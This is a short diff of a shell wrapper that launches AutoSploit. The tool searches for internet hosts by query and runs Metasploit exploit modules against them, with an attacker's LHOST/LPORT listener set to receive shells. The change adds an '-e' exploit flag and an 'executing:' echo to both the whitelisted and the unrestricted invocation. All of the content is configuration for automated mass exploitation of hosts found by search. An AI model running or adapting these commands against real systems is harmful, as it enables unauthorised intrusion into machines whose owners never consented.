@@ -19,11 +19,11 @@ TIMESTAMP=`date +%s`
 
 
 if [ ! $WHITELIST ]; then
-  echo "python autosploit.py -s -c -q \"${SEARCH_QUERY}\" --overwrite -C \"msf_autorun_${TIMESTAMP}\" $LHOST $LPORT --exploit-file-to-use etc/json/default_modules.json --dry-run"
+  echo "executing: python autosploit.py -s -c -q \"${SEARCH_QUERY}\" --overwrite -C \"msf_autorun_${TIMESTAMP}\" $LHOST $LPORT --exploit-file-to-use etc/json/default_modules.json --dry-run -e"
 
-  python autosploit.py -s -c -q "${SEARCH_QUERY}" --overwrite -C "msf_autorun_${TIMESTAMP}" $LHOST $LPORT --exploit-file-to-use etc/json/default_modules.json --dry-run
+  python autosploit.py -s -c -q "${SEARCH_QUERY}" --overwrite -C "msf_autorun_${TIMESTAMP}" $LHOST $LPORT --exploit-file-to-use etc/json/default_modules.json --dry-run -e
 else
-    echo "python autosploit.py -s -c -q \"${SEARCH_QUERY}\" --overwrite --whitelist $WHITELIST -e -C \"msf_autorun_${TIMESTAMP}\" $LHOST $LPORT --exploit-file-to-use etc/json/default_modules.json --dry-run"
+  echo "executing: python autosploit.py -s -c -q \"${SEARCH_QUERY}\" --overwrite --whitelist $WHITELIST -e -C \"msf_autorun_${TIMESTAMP}\" $LHOST $LPORT --exploit-file-to-use etc/json/default_modules.json --dry-run -e"
 
-  python autosploit.py -s -c -q "${SEARCH_QUERY}" --overwrite --whitelist $WHITELIST -e -C "msf_autorun_${TIMESTAMP}" $LHOST $LPORT --exploit-file-to-use etc/json/default_modules.json --dry-run
+  python autosploit.py -s -c -q "${SEARCH_QUERY}" --overwrite --whitelist $WHITELIST -e -C "msf_autorun_${TIMESTAMP}" $LHOST $LPORT --exploit-file-to-use etc/json/default_modules.json --dry-run -e
 fi;
